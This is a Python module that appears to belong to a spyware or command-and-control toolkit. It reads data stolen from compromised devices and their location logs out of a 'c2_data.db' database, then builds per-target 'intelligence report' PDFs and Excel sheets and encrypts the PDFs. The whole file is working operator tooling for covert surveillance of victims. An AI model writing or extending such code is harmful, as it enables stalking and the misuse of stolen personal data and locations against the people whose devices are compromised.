import os
import json
import logging
import sqlite3
import pandas as pd
from datetime import datetime
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter, A4
from reportlab.lib.utils import ImageReader
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

logger = logging.getLogger(__name__)

class ReportGenerator:
    def __init__(self, db_path="../c2/c2_data.db", reports_dir="reports"):
        self.db_path = db_path
        self.reports_dir = reports_dir
        os.makedirs(self.reports_dir, exist_ok=True)
        self.master_key = self._load_master_key()

    def _load_master_key(self):
        key_b64 = os.environ.get("REPORT_MASTER_KEY")
        if key_b64:
            return base64.b64decode(key_b64)
        # fallback: derive from environment secret
        secret = os.environ.get("MASTER_SECRET_B64", "").encode()
        if not secret:
            raise ValueError("MASTER_SECRET_B64 or REPORT_MASTER_KEY must be set")
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=b"report_salt", iterations=100000)
        return kdf.derive(secret)

    def _encrypt_file(self, file_path):
        fernet = Fernet(base64.b64encode(self.master_key))
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        enc_path = file_path + ".enc"
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        os.remove(file_path)
        return enc_path

    def fetch_target_data(self, target_id):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        # exfiltrated_data table
        cursor.execute("SELECT timestamp, data FROM exfiltrated_data WHERE device_id = ? ORDER BY timestamp", (target_id,))
        logs = [{"timestamp": row[0], "data": row[1]} for row in cursor.fetchall()]
        # location_logs table
        cursor.execute("SELECT latitude, longitude, timestamp FROM location_logs WHERE device_id = ? ORDER BY timestamp", (target_id,))
        locations = [{"lat": row[0], "lon": row[1], "timestamp": row[2]} for row in cursor.fetchall()]
        conn.close()
        return {"logs": logs, "locations": locations}

    def generate_pdf_report(self, target_id, data):
        pdf_path = os.path.join(self.reports_dir, f"report_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
        c = canvas.Canvas(pdf_path, pagesize=A4)
        width, height = A4
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, height - 50, f"Intelligence Report for Target: {target_id}")
        c.setFont("Helvetica", 10)
        y = height - 80
        # logs
        c.drawString(50, y, "Exfiltrated Data:")
        y -= 15
        for entry in data["logs"][-20:]:  # last 20 entries
            c.drawString(70, y, f"{entry['timestamp']} : {entry['data'][:80]}...")
            y -= 12
            if y < 50:
                c.showPage()
                y = height - 50
        # locations
        if data["locations"]:
            c.showPage()
            y = height - 50
            c.drawString(50, y, "Location History:")
            y -= 15
            for loc in data["locations"][-10:]:
                c.drawString(70, y, f"{loc['timestamp']} : ({loc['lat']}, {loc['lon']})")
                y -= 12
                if y < 50:
                    c.showPage()
                    y = height - 50
        c.save()
        logger.info(f"PDF report generated: {pdf_path}")
        return pdf_path

    def generate_excel_report(self, target_id, data):
        excel_path = os.path.join(self.reports_dir, f"data_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx")
        with pd.ExcelWriter(excel_path, engine='openpyxl') as writer:
            if data["logs"]:
                df_logs = pd.DataFrame(data["logs"])
                df_logs.to_excel(writer, sheet_name="Logs", index=False)
            if data["locations"]:
                df_loc = pd.DataFrame(data["locations"])
                df_loc.to_excel(writer, sheet_name="Locations", index=False)
        logger.info(f"Excel report generated: {excel_path}")
        return excel_path

    def generate_full_report(self, target_id):
        data = self.fetch_target_data(target_id)
        if not data["logs"] and not data["locations"]:
            logger.warning(f"No data for target {target_id}")
            return None
        pdf = self.generate_pdf_report(target_id, data)
        excel = self.generate_excel_report(target_id, data)
        # optionally encrypt the PDF (if sensitive)
        enc_pdf = self._encrypt_file(pdf)
        logger.info(f"Encrypted PDF: {enc_pdf}")
        return {"pdf": enc_pdf, "excel": excel}

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: report_generator.py <target_id>")
        sys.exit(1)
    rg = ReportGenerator()
    res = rg.generate_full_report(sys.argv[1])
    if res:
        print(f"Reports generated: {res}")
    else:
        print("No data found.")